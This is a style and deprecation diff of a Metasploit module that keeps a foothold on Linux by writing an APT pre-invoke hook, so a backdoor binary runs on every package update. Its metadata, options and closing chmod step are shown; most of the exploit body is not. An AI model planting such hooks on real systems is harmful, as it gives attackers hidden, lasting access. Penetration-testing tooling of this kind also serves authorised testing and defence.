@@ -9,21 +9,24 @@ class MetasploitModule < Msf::Exploit::Local
   include Msf::Exploit::FileDropper
   include Msf::Post::File
   include Msf::Post::Linux::System
+  include Msf::Exploit::Deprecated
+  moved_from 'exploits/linux/local/apt_package_manager_persistence'
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'APT Package Manager Persistence',
-      'Description'    => %q(
-        This module will run a payload when the package manager is used. No
-        handler is ran automatically so you must configure an appropriate
-        exploit/multi/handler to connect. This module creates a pre-invoke hook
-        for APT in apt.conf.d. The hook name syntax is numeric followed by text.
-      ),
-      'License'        => MSF_LICENSE,
-      'Author'         => ['Aaron Ringo'],
-      'Platform'       => ['linux', 'unix'],
-      'Arch'           =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'APT Package Manager Persistence',
+        'Description' => %q{
+          This module will run a payload when the package manager is used. No
+          handler is ran automatically so you must configure an appropriate
+          exploit/multi/handler to connect. This module creates a pre-invoke hook
+          for APT in apt.conf.d. The hook name syntax is numeric followed by text.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['Aaron Ringo'],
+        'Platform' => ['linux', 'unix'],
+        'Arch' => [
           ARCH_CMD,
           ARCH_X86,
           ARCH_X64,
@@ -33,24 +36,27 @@ class MetasploitModule < Msf::Exploit::Local
           ARCH_MIPSLE,
           ARCH_MIPSBE
         ],
-      'SessionTypes'   => ['shell', 'meterpreter'],
-      'DefaultOptions' => { 'WfsDelay' => 0, 'DisablePayloadHandler' => true },
-      'DisclosureDate' => '1999-03-09', # Date APT package manager was included in Debian
-      'References'     => ['URL', 'https://unix.stackexchange.com/questions/204414/how-to-run-a-command-before-download-with-apt-get'],
-      'Targets'        => [['Automatic', {}]],
-      'DefaultTarget'  => 0
-    ))
+        'SessionTypes' => ['shell', 'meterpreter'],
+        'DefaultOptions' => { 'WfsDelay' => 0, 'DisablePayloadHandler' => true },
+        'DisclosureDate' => '1999-03-09', # Date APT package manager was included in Debian
+        'References' => ['URL', 'https://unix.stackexchange.com/questions/204414/how-to-run-a-command-before-download-with-apt-get'],
+        'Targets' => [['Automatic', {}]],
+        'DefaultTarget' => 0
+      )
+    )
 
     register_options(
       [
         OptString.new('HOOKNAME', [false, 'Name of hook file to write']),
         OptString.new('BACKDOOR_NAME', [false, 'Name of binary to write'])
-      ])
+      ]
+    )
 
     register_advanced_options(
       [
         OptString.new('WritableDir', [true, 'A directory where we can write files', '/usr/local/bin/'])
-      ])
+      ]
+    )
   end
 
   def exploit
@@ -89,6 +95,6 @@ class MetasploitModule < Msf::Exploit::Local
     print_status('Backdoor will run on next APT update')
 
     # permissions chosen to reflect common perms in /usr/local/bin/
-    chmod(backdoor_path, 0755)
+    chmod(backdoor_path, 0o755)
   end
 end
